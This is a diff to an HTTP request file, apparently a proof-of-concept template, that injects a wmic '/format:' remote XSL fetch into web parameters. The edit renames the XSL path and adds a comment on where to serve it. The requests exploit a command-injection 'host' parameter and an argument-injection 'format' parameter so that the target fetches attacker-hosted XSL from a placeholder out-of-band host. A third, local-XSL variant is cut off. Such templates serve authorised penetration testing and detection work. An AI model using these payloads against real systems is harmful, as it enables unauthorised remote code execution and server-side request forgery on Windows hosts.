@@ -9,14 +9,16 @@
 # it doubles as an SSRF target (wmic performs the HTTP fetch itself).
 #
 # WHAT TO EDIT: target.example.invalid + the vulnerable parameter; YOUR-OOB-HOST.
+# Serve the XSL from your listener at /windows_wmic_format_poc.xsl - the exact
+# path requests 1 and 2 below fetch (request 3 is a local file you write there).
 # ============================================================================
 
 ### 1) via command-injection param (host param reaching cmd.exe)
-GET https://target.example.invalid/api/ping?host=127.0.0.1&&wmic+os+get+/format:%22http://wmic1.YOUR-OOB-HOST.example.invalid/poc.xsl%22 HTTP/1.1
+GET https://target.example.invalid/api/ping?host=127.0.0.1&&wmic+os+get+/format:%22http://wmic1.YOUR-OOB-HOST.example.invalid/windows_wmic_format_poc.xsl%22 HTTP/1.1
 Host: target.example.invalid
 
 ### 2) via argument-injection param (a 'format/template' option the app passes to wmic)
-GET https://target.example.invalid/api/sysinfo?format=http://wmic2.YOUR-OOB-HOST.example.invalid/poc.xsl HTTP/1.1
+GET https://target.example.invalid/api/sysinfo?format=http://wmic2.YOUR-OOB-HOST.example.invalid/windows_wmic_format_poc.xsl HTTP/1.1
 Host: target.example.invalid
 
 ### 3) local XSL after file-write primitive (traversal/upload landed the xsl)
